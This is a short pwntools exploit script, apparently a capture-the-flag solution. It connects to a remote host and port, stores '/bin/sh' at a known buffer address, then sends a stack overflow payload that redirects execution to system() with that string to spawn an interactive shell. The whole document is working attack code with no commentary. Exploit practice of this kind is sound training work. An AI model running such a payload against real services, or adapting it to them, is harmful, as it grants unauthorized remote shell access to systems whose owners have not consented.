from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 52389)
#sh = gdb.debug('./pwn')
context.binary = './pwn'
e = ELF('./pwn')
context.log_level = 'debug'

_name_addr = 0x804A080
_system_addr = e.symbols['system']

sh.recv()

sh.sendline(b'/bin/sh\0')

sh.recv()


payload = flat([b'a'*(0x26+4), _system_addr, 0xdeadbeef, _name_addr])

sh.sendline(payload)

sh.interactive()
